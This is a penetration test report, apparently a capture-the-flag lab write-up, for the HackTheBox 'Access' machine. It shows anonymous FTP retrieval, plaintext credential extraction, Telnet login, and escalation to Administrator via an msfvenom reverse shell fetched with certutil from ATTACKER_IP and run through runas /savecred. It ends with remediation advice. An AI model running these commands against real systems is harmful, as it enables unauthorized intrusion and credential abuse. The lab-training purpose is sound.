# HTB Access - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-4-7

---

## 0. Lesson Learned

Keep going through Priv Esc checklists one field at a time and you will find a way.

---

## 1. Executive Summary

A penetration test was conducted against the Access target system. Multiple vulnerabilities were identified, including anonymous FTP access exposing sensitive files, credential disclosure within backup data, and insecure credential storage enabling privilege escalation.

Initial access was achieved by extracting credentials from a publicly accessible backup file obtained via anonymous FTP. These credentials were used to authenticate to a Telnet service. Privilege escalation was achieved by abusing stored administrative credentials and executing a reverse shell as the Administrator user.

The system was fully compromised.

---

## 2. Scope

- **Target:** 10.129.216.232
- **Environment:** HackTheBox Access (Retired Machine)
- **Testing Window:** 2026-4-5 to 2026-4-7
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP-port scan was performed.

Command:

```
nmap -p- -sC -sV 10.129.216.232 -T4 -oA access_tcp
```

Output (relevant):

```
21/tcp open  ftp     Microsoft ftpd (Anonymous login allowed)
23/tcp open  telnet  Microsoft Telnet Service
80/tcp open  http    Microsoft IIS httpd 7.5
```

Interpretation:
Multiple services are exposed. Anonymous FTP access presents a likely entry point.

---

## 5. Enumeration

### FTP Enumeration

Anonymous FTP access was tested.

Command:

```
ftp access.htb
```

Output:

```
Name: anonymous
Password: anonymous
230 User logged in.
```

Interpretation:
Anonymous FTP login is permitted, allowing file access.

Directory listing revealed sensitive files :

- `Backups/backup.mdb`
- `Engineer/Access Control.zip`

Files were downloaded.

Command:

```
binary
cd Backups
get backup.mdb
cd ../Engineer
get "Access Control.zip"
```

Output:

```
Transfer complete.
```

Interpretation:
Backup database and archive were successfully retrieved for offline analysis.

### Database Analysis

The `.mdb` file was analyzed.

Command:

```
mdb-tables backup.mdb
```

Output (relevant):

```
auth_user
USERINFO
```

Interpretation:
Database contains user-related tables.

Credentials were extracted.

Command:

```
mdb-json backup.mdb auth_user
```

Output (relevant):

```
admin : admin
engineer : access4u@security
backup_admin : admin
```

Interpretation:
Valid credentials were recovered.

### Archive Analysis

The ZIP archive required an alternative extraction method .

Command:

```
7z e "Access Control.zip"
```

Output:

```
Enter password:
```

Password identified:

```
access4u@security
```

Extraction revealed a .pst file.

The PST file was analyzed externally, revealing additional credentials :

```
security : 4Cc3ssC0ntr0ller
```

Interpretation:
Valid Telnet credentials were obtained.

---

## 6. Initial Access

Telnet access was attempted using discovered credentials.

Command:

```
telnet access.htb
```

Output:

```
login: security
password: 4Cc3ssC0ntr0ller
Microsoft Telnet Service
```

Interpretation:
Successful authentication provided shell access.

Verification:

Command:

```
whoami
hostname
```

Output:

```
access\security
ACCESS
```

Interpretation:
Access obtained as low-privileged user `security`.

---

## 7. Post-Exploitation

System information was gathered.

Command:

```
systeminfo
```

Output (relevant):

```
OS Name: Microsoft Windows Server 2008 R2 Standard
Hotfix(s): 110 Hotfix(s) Installed
```

Interpretation:
System is relatively patched; alternative privilege escalation methods required.

Stored credentials were enumerated.

Command:

```
cmdkey /list
```

Output:

```
Target: Domain:interactive=ACCESS\Administrator
User: ACCESS\Administrator
```

Interpretation:
Administrator credentials are stored and can be reused.

---

## 8. Privilege Escalation

A reverse shell payload was generated.

Command:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o reverse.exe
```

Output:

```
Saved as: reverse.exe
```

The payload was transferred to the target.

Command:

```
certutil -urlcache -split -f http://ATTACKER_IP/reverse.exe reverse.exe
```

Output:

```
CertUtil: -URLCache command completed successfully.
```

A listener was started.

Command:

```
nc -lnvp 443
```

Output:

```
listening on [any] 443 ...
```

The payload was executed using stored Administrator credentials.

Command:

```
runas /savecred /user:Administrator C:\Users\security\reverse.exe
```

Output (relevant):

```
connect to [ATTACKER_IP]
```

Interpretation:
Reverse shell executed with Administrator privileges.

Verification:

Command:

```
whoami
hostname
ipconfig
```

Output:

```
access\administrator
ACCESS
10.129.216.232
```

Interpretation:
Privilege escalation to Administrator was successful.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\security\Desktop\user.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\root.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Anonymous FTP Access Exposing Sensitive Files

**Severity:** High

**Description:**
The FTP service allowed anonymous login and exposed sensitive backup and configuration files.

**Impact:**
Attackers could retrieve internal data, including credential databases and archived files, aiding further compromise.

**Recommendation:**
Disable anonymous FTP access, restrict file permissions, and ensure sensitive files are not stored in publicly accessible directories.

### **Finding:** Credential Exposure in Backup Files

**Severity:** Critical

**Description:**
Sensitive credentials were stored in plaintext within backup database files accessible to unauthorized users.

**Impact:**
Attackers could recover valid credentials through offline analysis and gain unauthorized access to systems or services.

**Recommendation:**
Encrypt sensitive data within backups, restrict access to backup storage locations, and implement secure backup handling procedures.

### **Finding:** Stored Administrative Credentials via Windows Credential Manager

**Severity:** Critical

**Description:**
Administrative credentials were stored locally and retrievable using Windows Credential Manager (e.g., `cmdkey`).

**Impact:**
Attackers could extract stored credentials and reuse them to escalate privileges or access additional systems.

**Recommendation:**
Avoid storing administrative credentials on systems, enforce credential protection mechanisms such as Credential Guard, and regularly audit stored credentials.